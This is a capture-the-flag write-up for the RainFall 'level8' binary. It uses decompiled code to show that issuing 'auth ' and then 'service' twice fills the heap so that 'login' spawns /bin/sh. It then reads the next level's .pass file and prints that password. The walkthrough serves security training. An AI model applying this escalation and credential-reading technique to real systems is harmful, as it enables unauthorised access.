@@ -1,0 +1,124 @@
+# We have a executable "level8" lets do some test!
+
+>level8@RainFall:~$ ./level8
+(nil), (nil) 
+test
+(nil), (nil) 
+test test
+(nil), (nil) 
+
+(nil), (nil) 
+^C
+>level8@RainFall:~$
+
+# So the program don't exit on his own, read stdin and write (nil) two time.
+
+# Let's disasamble the code with gdb
+
+(gdb) disas main
+Dump of assembler code for function main:
+[...]
+[...]
+[...]
+[...]
+
+# The code is pretty big, it will be hard to understand it with only gdb
+
+# We are going to use a site called dogbolt (https://dogbolt.org)
+
+# After uploading the file in the site, it will decompile the code then retransmit it in C language
+
+# Here a sample
+
+[...]
+int32_t main(int32_t argc, char** argv, char** envp)
+{
+    while (true)
+    {
+        uint32_t* const fp;
+        printf("%p, %p \n", auth, service, fp);
+        void buf;
+        char* eax_1 = fgets(&buf, 0x80, stdin);
+        bool c_1 = false;
+        bool z_1 = (eax_1 & eax_1) == 0;
+        if (z_1)
+        {
+            break;
+        }
+[...]
+
+# Much easier to read it.
+
+# We can see some keyword in clear (we are using the BinaryNinja mode)
+
+char const* const edi_1 = "auth ";
+char const* const edi_3 = "reset";
+char const* const edi_4 = "service";
+char const* const edi_5 = "login";
+
+# And that the code will make a system call if we meet the conditions
+
+if (*(auth + 0x20) == 0)
+{
+    fp = stdout;
+    fwrite("Password:\n", 1, 0xa, fp);
+}
+else
+{
+    system("/bin/sh");
+}
+
+# So the address at auth + 0x20 needs to not be null for the system call do happen
+
+# The "auth " keyword will make a malloc for a auth variable and assign a value to it perfect!
+
+# The "reset" keyword will free the auth variable
+
+# The "service" one will strdup a unknow address and return it to the service variable
+
+# And lastly the "login" variable will trigger the if and else condition for the system call (see above)
+
+# Let's do some test!
+
+>level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth 
+0x804a008, (nil)
+
+# The keyword work and display the address of the variable to!
+
+auth 
+0x804a018, (nil) 
+auth 
+0x804a028, (nil)
+
+# Writing more "auth " only change the address
+
+login
+Password:
+0x804a028, (nil)
+
+# Login don't work yet and the reset will not improve our situations maybe service will?
+
+service
+0x804a028, 0x804a038
+
+# The second address was change! And it's 0x10 value after the auth one!
+
+service
+0x804a028, 0x804a048
+
+# With a second service now the address is 0x20 after auth maybe login will work?
+
+login
+$ whoami
+level9
+$ 
+
+# Bingo
+
+$ cd ..
+$ cd level9
+$ cat .pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+$
